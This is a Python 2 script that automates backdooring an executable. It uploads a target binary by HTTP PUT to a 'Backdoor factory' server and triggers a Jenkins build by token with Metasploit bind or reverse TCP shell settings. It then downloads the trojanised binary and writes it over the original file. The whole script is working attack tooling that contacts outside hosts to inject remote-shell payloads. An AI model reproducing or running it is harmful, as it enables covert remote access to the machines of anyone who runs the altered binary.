#!/usr/bin/python
import argparse
import os
import sys
import time
import uuid
import urllib2

# configure
parser = argparse.ArgumentParser()
parser.add_argument('b', help='full path to target binary')
parser.add_argument('s', help='Backdoor factory server name or IP, e.g. some.domain.com or 1.2.3.4')
parser.add_argument('p', help='PUT php file path')
parser.add_argument('j', help='Jenkins server name or IP, e.g. some.domain.com or 1.2.3.4:8080')
parser.add_argument('k', help='Jenkin build key')
parser.add_argument('n', help='Jenkin build job name')
parser.add_argument('o', help='OS type: 0 = Linux/x86, 1 = Windows/x86', type=int)
parser.add_argument('pay', help='payload type: 0 = MSF TCP Bind (requires -port), 1 = MSF TCP Reverse (requires -rip & -port)', type=int)
parser.add_argument('port', help='MSF TCP Bind/Reverse Shell Port Number', type=int)
parser.add_argument('rip', help='MSF TCP reverse payload IP address')

args = parser.parse_args()

binaryPath = args.b
jenkinsIP = 'http://' + args.j
hostIP = 'http://' + args.s
indir = '/in/'
outdir = '/out/'
putfn = args.p
osType = args.o
jenkins_bn = args.n
jenkins_key = args.k
payloadType = args.pay
payloadPort = args.port
payloadIP = args.rip
if args.pay == 1:
    if not args.rip:
        print '-rip parameter required when using MSF TCP Reverse Shell Payload'
        parser.print_help()
        sys.exit(1)
    else:
        reverseIP = args.rip


# modify subclass urllib2.Request to support defining HTTP method in constructor
class MethodRequest(urllib2.Request):
    def __init__(self, *args, **kwargs):
        if 'method' in kwargs:
            self._method = kwargs['method']
            del kwargs['method']
        else:
            self._method = None
        return urllib2.Request.__init__(self, *args, **kwargs)

    def get_method(self, *args, **kwargs):
        if self._method is not None:
            return self._method
        return urllib2.Request.get_method(self, *args, **kwargs)

# file info
fileLocation = os.path.dirname(binaryPath)
if os.name == 'posix':
    fileLocation += '/'
if os.name == 'nt':
    fileLocation += '\\'
fileName = os.path.basename(binaryPath)
uploadFileName = str(uuid.uuid4())
print '[*]name is ' + fileLocation + fileName
print '[*]uploading ' + uploadFileName

# read file
fileData = file(binaryPath).read()

# Make a upload file name
uploadDir = indir + uploadFileName
# put file
uploadURL = hostIP + '/' + putfn + uploadDir

print '[*] PUT file ' + uploadURL
req = MethodRequest(url=uploadURL, method='PUT', data=fileData)
res = urllib2.urlopen(req)


"""Use the following URL to trigger build remotely: JENKINS_URL/job/test_proj1/build?token=TOKEN_NAME or /buildWithParameters?token=TOKEN_NAME
Optionally append &cause=Cause+Text to provide text that will be included in the recorded build cause."""

# trigger Jenkins job
bulid_prams = '/job/' + jenkins_bn + '/buildWithParameters?token=' + jenkins_key + '&delay=0' +'&dir=' + uploadFileName  + '&Payload_Type=' + str(payloadType) + '&port=' + str(payloadPort) + '&IP=' +  payloadIP + '&binName=' + fileLocation + fileName
jenkins_url = jenkinsIP + bulid_prams
print '[*] Jenkins URL ' + jenkins_url

#req = MethodRequest(
req2 = urllib2.urlopen(jenkins_url)
if req2.getcode() == 201:
    print '[*] SUCCESS'
    # call URL with params

# poll for backdoor file for 2 minutes, every 30 seconds
endTime = time.time() + 120 
downloadURL = hostIP + outdir + uploadFileName
while time.time() < endTime:
    print '[*] trying to get file...' + downloadURL
    try:
        f = urllib2.urlopen(downloadURL)
        if f.getcode() == 200:
            data = f.read()
            writeName = os.path.join(fileLocation, fileName)
            print 'writing to...' + writeName
            with open(writeName, "wb") as code:
                code.write(data)
                '[*] wrote file'
                break
        else:
            print '[*] didn\'t get file...sleeping'
            time.sleep(30)
    except:
        time.sleep(30)
